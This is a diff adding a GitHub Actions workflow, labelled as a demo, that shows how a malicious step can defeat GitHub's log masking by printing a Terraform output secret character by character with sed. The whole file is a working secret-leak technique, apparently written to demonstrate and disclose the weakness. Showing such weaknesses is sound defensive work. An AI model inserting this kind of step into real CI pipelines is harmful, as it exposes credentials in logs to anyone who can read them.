@@ -1,0 +1,42 @@
+# DEMO: Shows how a malicious step can exfiltrate Terraform outputs
+# character-by-character to bypass GitHub Actions log masking.
+# Use only with dummy values in a test repo.
+
+name: Terraform output exfil (demo)
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  terraform-exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Terraform
+        uses: hashicorp/setup-terraform@v3
+        with:
+          terraform_version: "1.6.0"
+
+      - name: Terraform init
+        working-directory: terraform
+        run: terraform init -input=false
+
+      - name: Terraform apply
+        working-directory: terraform
+        run: terraform apply -input=false -auto-approve -var="db_password=DEMO_SECRET_VALUE"
+
+      # MALICIOUS STEP (demo): Read secret from Terraform output and print
+      # char-by-char so GitHub's log masker does not redact it (masking
+      # matches whole values, not split output).
+      - name: "[DEMO] Exfil secret via char-by-char print"
+        working-directory: terraform
+        run: |
+          echo "Direct output (will be masked):"
+          terraform output -raw db_password || true
+          echo ""
+          echo "Bypass: character-by-character (secret visible in log):"
+          terraform output -raw db_password | sed 's/./& /g'
